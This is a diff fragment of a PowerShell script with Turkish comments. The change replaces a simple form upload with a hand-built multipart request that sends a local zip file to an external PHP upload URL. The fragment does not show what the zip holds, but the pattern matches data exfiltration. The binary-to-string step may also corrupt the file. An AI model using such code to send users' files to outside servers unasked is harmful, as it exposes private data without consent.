@@ -92,14 +92,27 @@ $url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si
 
 if (Test-Path $zipFilePath) {
     try {
-        # Invoke-WebRequest ile dosya yükleme
-        $form = @{
-            fileToUpload = Get-Item -Path $zipFilePath
-        }
+        # Multipart form-data oluşturma
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $contentType = "multipart/form-data; boundary=$boundary"
 
-        $response = Invoke-WebRequest -Uri $url -Method Post -Form $form -ErrorAction Stop
+        # Dosya içeriğini oku
+        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
+        $fileName = [System.IO.Path]::GetFileName($zipFilePath)
 
-        # Yanıtı çıktı olarak göster
+        # Multipart form-data body oluşturma
+        $body = (
+            "--$boundary`r`n" +
+            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`n" +
+            "Content-Type: application/zip`r`n`r`n" +
+            [System.Text.Encoding]::Default.GetString($fileBytes) + "`r`n" +
+            "--$boundary--`r`n"
+        )
+
+        # POST isteğini gönder
+        $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType $contentType -ErrorAction Stop
+
+        # Yanıtı göster
         Write-Output $response
     } catch {
         Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
